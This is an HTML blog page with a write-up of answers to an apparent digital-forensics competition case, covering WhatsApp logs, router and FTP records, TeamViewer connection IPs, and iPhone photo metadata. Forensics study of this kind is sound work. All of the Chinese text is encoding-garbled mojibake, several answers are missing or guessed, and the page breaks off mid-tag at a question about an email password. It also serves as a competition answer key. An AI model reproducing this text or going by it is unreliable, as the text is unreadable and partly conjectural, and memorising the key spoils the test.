title="16.å·¥åœ°ä¸»ç®¡æ›¾ç”¨è®¡ç®—æœºä½¿ç”¨WhatsAppï¼Œä»–æ›¾å’Œä»¥ä¸‹å“ªä¸ªç”µè¯å·ç æ²Ÿé€š?"></a>16.å·¥åœ°ä¸»ç®¡æ›¾ç”¨è®¡ç®—æœºä½¿ç”¨WhatsAppï¼Œä»–æ›¾å’Œä»¥ä¸‹å“ªä¸ªç”µè¯å·ç æ²Ÿé€š?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/log.png" class="" title="alt text"><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/a.png" class="" title="alt text"><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°whatsappçš„logæ–‡ä»¶æ‰“å¼€å¯ä»¥æ‰å‡ºæ¥åº”è¯¥è®°å½•äº†webç«¯çš„ä¸€äº›å†…å®¹ã€‚<br>æŸ¥ä¸€ä¸‹85246761157å¯ä»¥æŸ¥åˆ°ï¼Œé‚£åº”è¯¥å°±æ˜¯è¿™ä¸ªäº†</p><h1 id="17-å¤šé€‰é¢˜-å·¥åœ°ä¸»ç®¡è®¡ç®—æœºçš„ç”¨æˆ·åç§°æ˜¯ç”šä¹ˆ-å…¶ç”¨æˆ·æ ‡è¯†ç¬¦æ˜¯ç”šä¹ˆ"><a href="#17-å¤šé€‰é¢˜-å·¥åœ°ä¸»ç®¡è®¡ç®—æœºçš„ç”¨æˆ·åç§°æ˜¯ç”šä¹ˆ-å…¶ç”¨æˆ·æ ‡è¯†ç¬¦æ˜¯ç”šä¹ˆ" class="headerlink" title="17.(å¤šé€‰é¢˜) å·¥åœ°ä¸»ç®¡è®¡ç®—æœºçš„ç”¨æˆ·åç§°æ˜¯ç”šä¹ˆ? å…¶ç”¨æˆ·æ ‡è¯†ç¬¦æ˜¯ç”šä¹ˆ?"></a>17.(å¤šé€‰é¢˜) å·¥åœ°ä¸»ç®¡è®¡ç®—æœºçš„ç”¨æˆ·åç§°æ˜¯ç”šä¹ˆ? å…¶ç”¨æˆ·æ ‡è¯†ç¬¦æ˜¯ç”šä¹ˆ?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/23.png" class="" title="alt text"><p>PC1</p><h1 id="18-å•é€‰é¢˜-å·¥åœ°ä¸»ç®¡è®¡ç®—æœºçš„é¢„è®¾æµè§ˆå™¨æ˜¯ç”šä¹ˆ"><a href="#18-å•é€‰é¢˜-å·¥åœ°ä¸»ç®¡è®¡ç®—æœºçš„é¢„è®¾æµè§ˆå™¨æ˜¯ç”šä¹ˆ" class="headerlink" title="18.(å•é€‰é¢˜) å·¥åœ°ä¸»ç®¡è®¡ç®—æœºçš„é¢„è®¾æµè§ˆå™¨æ˜¯ç”šä¹ˆ?"></a>18.(å•é€‰é¢˜) å·¥åœ°ä¸»ç®¡è®¡ç®—æœºçš„é¢„è®¾æµè§ˆå™¨æ˜¯ç”šä¹ˆ?</h1><p>é¢„è®¾æµè§ˆå™¨å…¶å®å°±æ˜¯é»˜è®¤æµè§ˆå™¨<br>æˆ‘ä»¬å¯ä»¥æ‰“å¼€ä»¿çœŸä¹‹ååˆ›å»ºåº”è¯¥htmlæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥ä»æµè§ˆå™¨çš„ä½¿ç”¨æ•°é‡ä¸ŠçŒœå‡ºæ˜¯è°·æ­Œ</p><h1 id="19"><a href="#19" class="headerlink" title="19."></a>19.</h1><h1 id="20-å¤šé€‰é¢˜-è·¯ç”±å™¨çš„è®°å½•ä¸­æ˜¾ç¤ºä»¥ä¸‹æœ‰å“ªäº›IPæ˜¯å…¬å¸çš„ç”µå­å™¨æ"><a href="#20-å¤šé€‰é¢˜-è·¯ç”±å™¨çš„è®°å½•ä¸­æ˜¾ç¤ºä»¥ä¸‹æœ‰å“ªäº›IPæ˜¯å…¬å¸çš„ç”µå­å™¨æ" class="headerlink" title="20.(å¤šé€‰é¢˜) è·¯ç”±å™¨çš„è®°å½•ä¸­æ˜¾ç¤ºä»¥ä¸‹æœ‰å“ªäº›IPæ˜¯å…¬å¸çš„ç”µå­å™¨æ?"></a>20.(å¤šé€‰é¢˜) è·¯ç”±å™¨çš„è®°å½•ä¸­æ˜¾ç¤ºä»¥ä¸‹æœ‰å“ªäº›IPæ˜¯å…¬å¸çš„ç”µå­å™¨æ?</h1><p>ä¸€ä¸ªä¸ªæœå¯ä»¥æœå‡ºæ¥abcdéƒ½æ˜¯</p><h1 id="21-è·¯ç”±å™¨çš„è®°å½•ä¸­æ˜¾ç¤ºå…¬å¸çš„è®¡ç®—æœºä¸‹è½½äº†FTPè½¯ä»¶ï¼Œè¯¥ä¸‹è½½ç½‘ç«™çš„IPæ˜¯ä»€éº¼-è¯·ä»¥äºšæ‹‰ä¼¯æ•°å­—ä½œç­”ï¼Œçœå»â€-â€ç¬¦å·"><a href="#21-è·¯ç”±å™¨çš„è®°å½•ä¸­æ˜¾ç¤ºå…¬å¸çš„è®¡ç®—æœºä¸‹è½½äº†FTPè½¯ä»¶ï¼Œè¯¥ä¸‹è½½ç½‘ç«™çš„IPæ˜¯ä»€éº¼-è¯·ä»¥äºšæ‹‰ä¼¯æ•°å­—ä½œç­”ï¼Œçœå»â€-â€ç¬¦å·" class="headerlink" title="21.è·¯ç”±å™¨çš„è®°å½•ä¸­æ˜¾ç¤ºå…¬å¸çš„è®¡ç®—æœºä¸‹è½½äº†FTPè½¯ä»¶ï¼Œè¯¥ä¸‹è½½ç½‘ç«™çš„IPæ˜¯ä»€éº¼?(è¯·ä»¥äºšæ‹‰ä¼¯æ•°å­—ä½œç­”ï¼Œçœå»â€.â€ç¬¦å·)"></a>21.è·¯ç”±å™¨çš„è®°å½•ä¸­æ˜¾ç¤ºå…¬å¸çš„è®¡ç®—æœºä¸‹è½½äº†FTPè½¯ä»¶ï¼Œè¯¥ä¸‹è½½ç½‘ç«™çš„IPæ˜¯ä»€éº¼?(è¯·ä»¥äºšæ‹‰ä¼¯æ•°å­—ä½œç­”ï¼Œçœå»â€.â€ç¬¦å·)</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/d.png" class="" title="alt text"><p>49.12.121.147</p><h1 id="22-å¤šé€‰é¢˜-è·¯ç”±å™¨çš„è®°å½•ä¸­æ˜¾ç¤ºå…¬å¸è®¡ç®—æœºçš„èµ„æ–™ç”¨FTPè½¯ä»¶ä¼ åˆ°äº†ç”šä¹ˆIPåœ°å€åŠåˆ©ç”¨ç«¯å£"><a href="#22-å¤šé€‰é¢˜-è·¯ç”±å™¨çš„è®°å½•ä¸­æ˜¾ç¤ºå…¬å¸è®¡ç®—æœºçš„èµ„æ–™ç”¨FTPè½¯ä»¶ä¼ åˆ°äº†ç”šä¹ˆIPåœ°å€åŠåˆ©ç”¨ç«¯å£" class="headerlink" title="22.(å¤šé€‰é¢˜) è·¯ç”±å™¨çš„è®°å½•ä¸­æ˜¾ç¤ºå…¬å¸è®¡ç®—æœºçš„èµ„æ–™ç”¨FTPè½¯ä»¶ä¼ åˆ°äº†ç”šä¹ˆIPåœ°å€åŠåˆ©ç”¨ç«¯å£?"></a>22.(å¤šé€‰é¢˜) è·¯ç”±å™¨çš„è®°å½•ä¸­æ˜¾ç¤ºå…¬å¸è®¡ç®—æœºçš„èµ„æ–™ç”¨FTPè½¯ä»¶ä¼ åˆ°äº†ç”šä¹ˆIPåœ°å€åŠåˆ©ç”¨ç«¯å£?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/26.png" class="" title="alt text"><p>æˆ‘ä»¬çœ‹è½¯ä»¶è¿æ¥è®°å½•å¯ä»¥å‘ç°ip<br><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/25.png" class="" title="alt text"><br>åœ¨logé‡Œæœä¸€ä¸‹å¯ä»¥å‘ç°å…¶ipå’Œç«¯å£</p><h1 id="23-å¤šé€‰é¢˜-è·¯ç”±å™¨çš„è®°å½•ä¸­æ˜¾ç¤ºä»¥ä¸‹å“ªäº›å…³é”®è¯æ˜¯è¡¨ç¤ºå…¬å¸è®¡ç®—æœºä¸å¤–ç•Œç½‘ç»œè”æœº"><a href="#23-å¤šé€‰é¢˜-è·¯ç”±å™¨çš„è®°å½•ä¸­æ˜¾ç¤ºä»¥ä¸‹å“ªäº›å…³é”®è¯æ˜¯è¡¨ç¤ºå…¬å¸è®¡ç®—æœºä¸å¤–ç•Œç½‘ç»œè”æœº" class="headerlink" title="23.(å¤šé€‰é¢˜) è·¯ç”±å™¨çš„è®°å½•ä¸­æ˜¾ç¤ºä»¥ä¸‹å“ªäº›å…³é”®è¯æ˜¯è¡¨ç¤ºå…¬å¸è®¡ç®—æœºä¸å¤–ç•Œç½‘ç»œè”æœº?"></a>23.(å¤šé€‰é¢˜) è·¯ç”±å™¨çš„è®°å½•ä¸­æ˜¾ç¤ºä»¥ä¸‹å“ªäº›å…³é”®è¯æ˜¯è¡¨ç¤ºå…¬å¸è®¡ç®—æœºä¸å¤–ç•Œç½‘ç»œè”æœº?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/25.png" class="" title="alt text"><p>FTPé€šä¿¡çš„ä¸¤ä¸ªå…³é”®è¯outside(è¾“å‡º)å’Œdestiation(ç›®æ ‡)éƒ½å¯ä»¥è¡¨ç¤º</p><h1 id="24-è·¯ç”±å™¨çš„è®°å½•ä¸­æ˜¾ç¤ºå“ªä¸€ä¸ªIPæ›¾ä»¥teamviewer-è¿æ¥å…¬å¸è®¡ç®—æœº"><a href="#24-è·¯ç”±å™¨çš„è®°å½•ä¸­æ˜¾ç¤ºå“ªä¸€ä¸ªIPæ›¾ä»¥teamviewer-è¿æ¥å…¬å¸è®¡ç®—æœº" class="headerlink" title="24.è·¯ç”±å™¨çš„è®°å½•ä¸­æ˜¾ç¤ºå“ªä¸€ä¸ªIPæ›¾ä»¥teamviewer è¿æ¥å…¬å¸è®¡ç®—æœº?"></a>24.è·¯ç”±å™¨çš„è®°å½•ä¸­æ˜¾ç¤ºå“ªä¸€ä¸ªIPæ›¾ä»¥teamviewer è¿æ¥å…¬å¸è®¡ç®—æœº?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/T.png" class="" title="alt text"><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/27.png" class="" title="alt text"><p>æ‰“å¼€è¿æ¥ä¿¡æ¯çš„æ–‡ä»¶å¯ä»¥å‘ç°è¯¦ç»†çš„è¿æ¥æ—¥å¿—ã€‚å‘ç°è¿æ¥æ—¶é—´åœ¨18å·çš„9ç‚¹31åˆ†10sã€‚åœ¨è·¯ç”±æ—¥å¿—ä¸­æŸ¥æ‰¾å‘ç°æ‰¾ä¸åˆ°ï¼Œä½†æ˜¯æ‰¾åˆ°äº†ç›¸è¿‘æ—¶é—´<br><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/28.png" class="" title="alt text"><br>çŒœæµ‹ä¸ºå»¶è¿Ÿã€‚<br>å®šä½åå°±ä¼šå‘ç°ipä¸º52.152.117.114</p><h1 id="25-å¤šé€‰é¢˜-è·¯ç”±å™¨çš„è®°å½•ä¸­æ˜¾ç¤ºä»¥ä¸‹å“ªä¸€ä¸ªæœ‰å¯èƒ½æ˜¯ä»¥-teamviewer-é¥æ§å…¬å¸è®¡ç®—æœºçš„æ—¶é—´"><a href="#25-å¤šé€‰é¢˜-è·¯ç”±å™¨çš„è®°å½•ä¸­æ˜¾ç¤ºä»¥ä¸‹å“ªä¸€ä¸ªæœ‰å¯èƒ½æ˜¯ä»¥-teamviewer-é¥æ§å…¬å¸è®¡ç®—æœºçš„æ—¶é—´" class="headerlink" title="25.(å¤šé€‰é¢˜) è·¯ç”±å™¨çš„è®°å½•ä¸­æ˜¾ç¤ºä»¥ä¸‹å“ªä¸€ä¸ªæœ‰å¯èƒ½æ˜¯ä»¥ teamviewer é¥æ§å…¬å¸è®¡ç®—æœºçš„æ—¶é—´?"></a>25.(å¤šé€‰é¢˜) è·¯ç”±å™¨çš„è®°å½•ä¸­æ˜¾ç¤ºä»¥ä¸‹å“ªä¸€ä¸ªæœ‰å¯èƒ½æ˜¯ä»¥ teamviewer é¥æ§å…¬å¸è®¡ç®—æœºçš„æ—¶é—´?</h1><p>åœ¨æ—¥å¿—ä»¥ipæ¥æœç´¢å¯ä»¥æ‰¾åˆ°æ—¶é—´</p><h1 id="26-è·¯ç”±å™¨çš„è®°å½•ä¸­æ˜¾ç¤ºæœ‰å¤šå°‘ç”µå­å™¨ææœ‰å¯èƒ½æ›¾è¢«å…¥ä¾µ-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—ä½œç­”"><a href="#26-è·¯ç”±å™¨çš„è®°å½•ä¸­æ˜¾ç¤ºæœ‰å¤šå°‘ç”µå­å™¨ææœ‰å¯èƒ½æ›¾è¢«å…¥ä¾µ-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—ä½œç­”" class="headerlink" title="26.è·¯ç”±å™¨çš„è®°å½•ä¸­æ˜¾ç¤ºæœ‰å¤šå°‘ç”µå­å™¨ææœ‰å¯èƒ½æ›¾è¢«å…¥ä¾µ?(è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—ä½œç­”)"></a>26.è·¯ç”±å™¨çš„è®°å½•ä¸­æ˜¾ç¤ºæœ‰å¤šå°‘ç”µå­å™¨ææœ‰å¯èƒ½æ›¾è¢«å…¥ä¾µ?(è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—ä½œç­”)</h1><p>æŠ•ç¨¿ipæ¥æœç´¢çœ‹æ—¥å¿—å¯ä»¥å‘ç°æœ‰ä¸‰ä¸ªæ—¶é—´æ®µçš„teamviewerè®°å½•æ‰€ä»¥åº”è¯¥æ˜¯3</p><h1 id="27-é˜¿åŠ›å£«-iPhone12proç”µè¯äº2021å¹´10æœˆ21æ—¥ï¼Œä»¥ä¸‹å“ªå¼ ç›¸ç‰‡å¯èƒ½æ›¾è¢«åˆ†äº«ï¼ˆUTC-8ï¼‰ï¼Ÿ"><a href="#27-é˜¿åŠ›å£«-iPhone12proç”µè¯äº2021å¹´10æœˆ21æ—¥ï¼Œä»¥ä¸‹å“ªå¼ ç›¸ç‰‡å¯èƒ½æ›¾è¢«åˆ†äº«ï¼ˆUTC-8ï¼‰ï¼Ÿ" class="headerlink" title="27.é˜¿åŠ›å£« iPhone12proç”µè¯äº2021å¹´10æœˆ21æ—¥ï¼Œä»¥ä¸‹å“ªå¼ ç›¸ç‰‡å¯èƒ½æ›¾è¢«åˆ†äº«ï¼ˆUTC+8ï¼‰ï¼Ÿ"></a>27.é˜¿åŠ›å£« iPhone12proç”µè¯äº2021å¹´10æœˆ21æ—¥ï¼Œä»¥ä¸‹å“ªå¼ ç›¸ç‰‡å¯èƒ½æ›¾è¢«åˆ†äº«ï¼ˆUTC+8ï¼‰ï¼Ÿ</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/yuan.png" class="" title="alt text"><p>åˆ†äº«è¿‡çš„å›¾ç‰‡ä¼šäº§ç”Ÿä¸€ä¸ªæ²¡æœ‰å…ƒæ•°æ®çš„ç¼©ç•¥å›¾ç‰‡ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯11</p><h1 id="28-é˜¿åŠ›å£«iPhone-12-proç”µè¯ä¸­å“ªä¸€å¼ ç›¸ç‰‡å¯èƒ½æ›¾è¢«ä¿®æ”¹æ‹æ‘„æ—¶é—´"><a href="#28-é˜¿åŠ›å£«iPhone-12-proç”µè¯ä¸­å“ªä¸€å¼ ç›¸ç‰‡å¯èƒ½æ›¾è¢«ä¿®æ”¹æ‹æ‘„æ—¶é—´" class="headerlink" title="28.é˜¿åŠ›å£«iPhone 12 proç”µè¯ä¸­å“ªä¸€å¼ ç›¸ç‰‡å¯èƒ½æ›¾è¢«ä¿®æ”¹æ‹æ‘„æ—¶é—´?"></a>28.é˜¿åŠ›å£«iPhone 12 proç”µè¯ä¸­å“ªä¸€å¼ ç›¸ç‰‡å¯èƒ½æ›¾è¢«ä¿®æ”¹æ‹æ‘„æ—¶é—´?</h1><h1 id="29-é˜¿åŠ›å£«iPhone-12-pro-çš„GSMåª’ä½“è®¿é—®æ§åˆ¶åœ°å€æ˜¯ä»€ä¹ˆ-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œä¸ç”¨è¾“å…¥â€"><a href="#29-é˜¿åŠ›å£«iPhone-12-pro-çš„GSMåª’ä½“è®¿é—®æ§åˆ¶åœ°å€æ˜¯ä»€ä¹ˆ-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œä¸ç”¨è¾“å…¥â€" class="headerlink" title="29.é˜¿åŠ›å£«iPhone 12 pro çš„GSMåª’ä½“è®¿é—®æ§åˆ¶åœ°å€æ˜¯ä»€ä¹ˆ? è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œä¸ç”¨è¾“å…¥â€:"></a>29.é˜¿åŠ›å£«iPhone 12 pro çš„GSMåª’ä½“è®¿é—®æ§åˆ¶åœ°å€æ˜¯ä»€ä¹ˆ? è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œä¸ç”¨è¾“å…¥â€:</h1><p>GSMå…¶å®å°±æ˜¯macåœ°å€<br><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/34.png" class="" title="alt text"></p><h1 id="30-é˜¿åŠ›å£«çš„iphone-12-proä»¥ä»€ä¹ˆå±å¹•å¯†ç ä¿æŠ¤"><a href="#30-é˜¿åŠ›å£«çš„iphone-12-proä»¥ä»€ä¹ˆå±å¹•å¯†ç ä¿æŠ¤" class="headerlink" title="30.é˜¿åŠ›å£«çš„iphone 12 proä»¥ä»€ä¹ˆå±å¹•å¯†ç ä¿æŠ¤?"></a>30.é˜¿åŠ›å£«çš„iphone 12 proä»¥ä»€ä¹ˆå±å¹•å¯†ç ä¿æŠ¤?</h1><h1 id="31-é˜¿åŠ›å£«iphone-12-proå†…ä»¥ä¸‹å“ªä¸€å¼ ç›¸ç‰‡æ˜¯å®å†µç›¸ç‰‡-live-Photos"><a href="#31-é˜¿åŠ›å£«iphone-12-proå†…ä»¥ä¸‹å“ªä¸€å¼ ç›¸ç‰‡æ˜¯å®å†µç›¸ç‰‡-live-Photos" class="headerlink" title="31.é˜¿åŠ›å£«iphone 12 proå†…ä»¥ä¸‹å“ªä¸€å¼ ç›¸ç‰‡æ˜¯å®å†µç›¸ç‰‡(live Photos)?"></a>31.é˜¿åŠ›å£«iphone 12 proå†…ä»¥ä¸‹å“ªä¸€å¼ ç›¸ç‰‡æ˜¯å®å†µç›¸ç‰‡(live Photos)?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/35.png" class="" title="alt text"><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/36.png" class="" title="alt text"><p>iosçš„å®å†µç…§ç‰‡çš„æ‹æ‘„ä¼šåœ¨åŒæ–‡ä»¶ä¸‹ç”Ÿæˆmovæ–‡ä»¶ã€‚</p><h1 id="32-ä»¥ä¸‹å“ªä¸€ä¸ªæ˜¯é˜¿åŠ›å£«iphone-12-proå¯èƒ½æ›¾ç»è¿æ¥çš„è£…ç½®åç§°"><a href="#32-ä»¥ä¸‹å“ªä¸€ä¸ªæ˜¯é˜¿åŠ›å£«iphone-12-proå¯èƒ½æ›¾ç»è¿æ¥çš„è£…ç½®åç§°" class="headerlink" title="32.ä»¥ä¸‹å“ªä¸€ä¸ªæ˜¯é˜¿åŠ›å£«iphone 12 proå¯èƒ½æ›¾ç»è¿æ¥çš„è£…ç½®åç§°?"></a>32.ä»¥ä¸‹å“ªä¸€ä¸ªæ˜¯é˜¿åŠ›å£«iphone 12 proå¯èƒ½æ›¾ç»è¿æ¥çš„è£…ç½®åç§°?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/37.png" class="" title="alt text"><p> Chrisâ€™s MacBook Pro</p><h1 id="33-æ¥ä¸Šé¢˜ï¼Œè®°å½•è¿æ¥æ—¶é—´æ˜¯ä»€ä¹ˆæ—¶å€™-UTC-8"><a href="#33-æ¥ä¸Šé¢˜ï¼Œè®°å½•è¿æ¥æ—¶é—´æ˜¯ä»€ä¹ˆæ—¶å€™-UTC-8" class="headerlink" title="33.æ¥ä¸Šé¢˜ï¼Œè®°å½•è¿æ¥æ—¶é—´æ˜¯ä»€ä¹ˆæ—¶å€™(UTC+8)?"></a>33.æ¥ä¸Šé¢˜ï¼Œè®°å½•è¿æ¥æ—¶é—´æ˜¯ä»€ä¹ˆæ—¶å€™(UTC+8)?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/38.png" class="" title="alt text"><p>é¢˜ç›®è¦æ±‚UTC+8æ‰€ä»¥å°±åŠ 8å°æ—¶å³å¯</p><h1 id="34-é˜¿åŠ›å£«iPhone-XRä¸­åœ¨è½¯ä»¶WhatsAppä¸­å·¥åœ°ä¸»ç®¡ä¸é˜¿åŠ›å£«çš„å¯¹è¯ä¸­æ›¾æåˆ°ï¼šä½¢å«æˆ‘ä¿¾é’±å–ï¼ŒBTCä¿‚å””ä¿‚å‘¢ä¸ªå•Šï¼Ÿã€‚åœ¨è¿›è¡Œç”µå­æ•°æ®å–è¯åˆ†æåï¼Œä»¥ä¸‹å“ªä¸€ä¸ªæ˜¯æœ‰å¯èƒ½å…³äºæ­¤å¯¹è¯çš„æ­£ç¡®æè¿°ï¼Ÿ"><a href="#34-é˜¿åŠ›å£«iPhone-XRä¸­åœ¨è½¯ä»¶WhatsAppä¸­å·¥åœ°ä¸»ç®¡ä¸é˜¿åŠ›å£«çš„å¯¹è¯ä¸­æ›¾æåˆ°ï¼šä½¢å«æˆ‘ä¿¾é’±å–ï¼ŒBTCä¿‚å””ä¿‚å‘¢ä¸ªå•Šï¼Ÿã€‚åœ¨è¿›è¡Œç”µå­æ•°æ®å–è¯åˆ†æåï¼Œä»¥ä¸‹å“ªä¸€ä¸ªæ˜¯æœ‰å¯èƒ½å…³äºæ­¤å¯¹è¯çš„æ­£ç¡®æè¿°ï¼Ÿ" class="headerlink" title="34.é˜¿åŠ›å£«iPhone XRä¸­åœ¨è½¯ä»¶WhatsAppä¸­å·¥åœ°ä¸»ç®¡ä¸é˜¿åŠ›å£«çš„å¯¹è¯ä¸­æ›¾æåˆ°ï¼šä½¢å«æˆ‘ä¿¾é’±å–ï¼ŒBTCä¿‚å””ä¿‚å‘¢ä¸ªå•Šï¼Ÿã€‚åœ¨è¿›è¡Œç”µå­æ•°æ®å–è¯åˆ†æåï¼Œä»¥ä¸‹å“ªä¸€ä¸ªæ˜¯æœ‰å¯èƒ½å…³äºæ­¤å¯¹è¯çš„æ­£ç¡®æè¿°ï¼Ÿ"></a>34.é˜¿åŠ›å£«iPhone XRä¸­åœ¨è½¯ä»¶WhatsAppä¸­å·¥åœ°ä¸»ç®¡ä¸é˜¿åŠ›å£«çš„å¯¹è¯ä¸­æ›¾æåˆ°ï¼šä½¢å«æˆ‘ä¿¾é’±å–ï¼ŒBTCä¿‚å””ä¿‚å‘¢ä¸ªå•Šï¼Ÿã€‚åœ¨è¿›è¡Œç”µå­æ•°æ®å–è¯åˆ†æåï¼Œä»¥ä¸‹å“ªä¸€ä¸ªæ˜¯æœ‰å¯èƒ½å…³äºæ­¤å¯¹è¯çš„æ­£ç¡®æè¿°ï¼Ÿ</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/39.png" class="" title="alt text"><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/40.png" class="" title="alt text"><p>å¯ä»¥å‘ç°åœ¨KariserLeeå’ŒAlexçš„WhatsAppçš„è¯¥æ¡èŠå¤©éƒ½è¢«åˆ é™¤ï¼Œè€ŒAlexå¹¶æ²¡æœ‰æƒé™åˆ é™¤Kariser Leeçš„èŠå¤©è®°å½•ï¼Œè€ŒKariserLeeå¯ä»¥æ’¤å›æ¶ˆæ¯ã€‚ä¸”é™„ä»¶æœ‰ä¸€å¼ å›¾ç‰‡</p><h1 id="35-é˜¿åŠ›å£«iPhone-XRçš„WhatsAppå¯¹è¯ä¸­ï¼Œé˜¿åŠ›å£«æ›¾è¦æ±‚å·¥åœ°ä¸»ç®¡æ”¯ä»˜å¤šå°‘ä¸ªBTC-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”"><a href="#35-é˜¿åŠ›å£«iPhone-XRçš„WhatsAppå¯¹è¯ä¸­ï¼Œé˜¿åŠ›å£«æ›¾è¦æ±‚å·¥åœ°ä¸»ç®¡æ”¯ä»˜å¤šå°‘ä¸ªBTC-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”" class="headerlink" title="35. é˜¿åŠ›å£«iPhone XRçš„WhatsAppå¯¹è¯ä¸­ï¼Œé˜¿åŠ›å£«æ›¾è¦æ±‚å·¥åœ°ä¸»ç®¡æ”¯ä»˜å¤šå°‘ä¸ªBTC? (è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)"></a>35. é˜¿åŠ›å£«iPhone XRçš„WhatsAppå¯¹è¯ä¸­ï¼Œé˜¿åŠ›å£«æ›¾è¦æ±‚å·¥åœ°ä¸»ç®¡æ”¯ä»˜å¤šå°‘ä¸ªBTC? (è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/41.png" class="" title="alt text"><p>10ä¸ª</p><h1 id="36-é˜¿åŠ›å£«iPhone-XRä¸­-â€œIMG-0056-HEICâ€çš„å›¾åƒä¸â€5005-JPGâ€-MD5-96c48152249536d14eaa80086c92fcb9-â€-çœ‹ä¼¼ä¸ºåŒä¸€å¼ ç›¸ç‰‡ï¼Œåœ¨ç”µå­æ•°æ®å–è¯åˆ†æä¸‹ï¼Œä»¥ä¸‹å“ªæ ·æè¿°æ˜¯æ­£ç¡®"><a href="#36-é˜¿åŠ›å£«iPhone-XRä¸­-â€œIMG-0056-HEICâ€çš„å›¾åƒä¸â€5005-JPGâ€-MD5-96c48152249536d14eaa80086c92fcb9-â€-çœ‹ä¼¼ä¸ºåŒä¸€å¼ ç›¸ç‰‡ï¼Œåœ¨ç”µå­æ•°æ®å–è¯åˆ†æä¸‹ï¼Œä»¥ä¸‹å“ªæ ·æè¿°æ˜¯æ­£ç¡®" class="headerlink" title="36.é˜¿åŠ›å£«iPhone XRä¸­ â€œIMG_0056.HEICâ€çš„å›¾åƒä¸â€5005.JPGâ€(MD5: 96c48152249536d14eaa80086c92fcb9)â€ çœ‹ä¼¼ä¸ºåŒä¸€å¼ ç›¸ç‰‡ï¼Œåœ¨ç”µå­æ•°æ®å–è¯åˆ†æä¸‹ï¼Œä»¥ä¸‹å“ªæ ·æè¿°æ˜¯æ­£ç¡®?"></a>36.é˜¿åŠ›å£«iPhone XRä¸­ â€œIMG_0056.HEICâ€çš„å›¾åƒä¸â€5005.JPGâ€(MD5: 96c48152249536d14eaa80086c92fcb9)â€ çœ‹ä¼¼ä¸ºåŒä¸€å¼ ç›¸ç‰‡ï¼Œåœ¨ç”µå­æ•°æ®å–è¯åˆ†æä¸‹ï¼Œä»¥ä¸‹å“ªæ ·æè¿°æ˜¯æ­£ç¡®?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/h.png" class="" title="alt text"><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/h2.png" class="" title="alt text"><p>ä¸¤ä¸ªçš„å›¾ç‰‡md5å€¼ä¸åŒã€‚<br>5005.JPGçš„åˆ†è¾¨ç‡æ›´ä½æ‰€ä»¥5005æ˜¯ç¼©ç•¥å›¾</p><h1 id="37-é˜¿åŠ›å£«iPhone-XRä¸­ç›¸ç‰‡æª”IMG-0056-HEICæä¾›äº†ä»€ä¹ˆç”µå­æ•°æ®å–è¯çš„ä¿¡æ¯"><a href="#37-é˜¿åŠ›å£«iPhone-XRä¸­ç›¸ç‰‡æª”IMG-0056-HEICæä¾›äº†ä»€ä¹ˆç”µå­æ•°æ®å–è¯çš„ä¿¡æ¯" class="headerlink" title="37.é˜¿åŠ›å£«iPhone XRä¸­ç›¸ç‰‡æª”IMG_0056.HEICæä¾›äº†ä»€ä¹ˆç”µå­æ•°æ®å–è¯çš„ä¿¡æ¯?"></a>37.é˜¿åŠ›å£«iPhone XRä¸­ç›¸ç‰‡æª”IMG_0056.HEICæä¾›äº†ä»€ä¹ˆç”µå­æ•°æ®å–è¯çš„ä¿¡æ¯?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/h3.png" class="" title="alt text"><p>æ‹æ‘„æ—¶é—´æ˜¯æ•è·æ—¶é—´æ¯”åˆ›å»ºæ—¶é—´æ—©ä¸”ç›¸æœºå‹å·æ˜¯iPhone12proï¼Œæ‰€ä»¥åº”è¯¥æ˜¯12proæ‹æ‘„çš„ã€‚<br>åˆå› ä¸ºæ˜¯å¤šé€‰æ‰€ä»¥åº”è¯¥æ˜¯airdropçš„æ–‡ä»¶</p><h1 id="38-é˜¿åŠ›å£«iPhone-XRä¸­é˜¿åŠ›å£«çš„ç”µé‚®è´¦æˆ·Alexc19851016-gmail-comçš„å¯†ç æœ‰å¯èƒ½æ˜¯ä»€ä¹ˆ"><a href="#38-é˜¿åŠ›å£«iPhone-XRä¸­é˜¿åŠ›å£«çš„ç”µé‚®è´¦æˆ·Alexc19851016-gmail-comçš„å¯†ç 